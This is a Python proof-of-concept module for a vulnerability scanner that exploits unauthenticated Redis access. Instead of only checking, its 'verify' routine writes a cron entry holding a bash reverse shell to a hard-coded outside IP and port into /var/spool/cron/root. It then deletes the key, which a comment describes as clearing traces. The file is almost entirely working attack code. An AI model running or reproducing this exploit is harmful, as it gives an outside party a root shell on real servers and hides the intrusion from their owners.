# -*- coding: utf-8 -*-
import urllib.parse
import redis
import socket
import random
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Redis_0102'  # 平台漏洞编号
    name = 'Redis Getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
    1 通过redis未授权访问漏洞,向redis插入一条记录,内容是反弹shell的定时任务
    2 通过redis数据导出功能,将含有定时任务代码的数据导出到/var/spool/cron/root
    3 监听端口,获取shell
    '''  # 漏洞描述
    ref = 'https://_thorns.gitbooks.io/sec/content/redis_getshellzi_dong_hua_shi_jian_zhi_cron.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Redis'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd1af4658-3c84-4eba-b901-18ddff4dc41d'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            target_parse = urllib.parse.urlparse(self.target)
            url = self.target
            ip = socket.gethostbyname(target_parse.hostname)
            port = target_parse.port if target_parse.port else 6379
            r = redis.Redis(host=ip, port=port, db=0, socket_timeout=10)
            listen_ip = '115.28.1.1'
            listen_port = 9999
            if 'redis_version' in r.info():
                payload = '\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1\n\n'.format(
                    ip=listen_ip, port=str(listen_port))
                path = '/var/spool/cron'
                name = 'root'
                key = ''.join([chr(random.randint(97, 123))
                               for _i in range(10)])
                r.set(key, payload)
                r.config_set('dir', path)
                r.config_set('dbfilename', name)
                r.save()
                r.delete(key)  # 清除痕迹
                r.config_set('dir', '/tmp')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
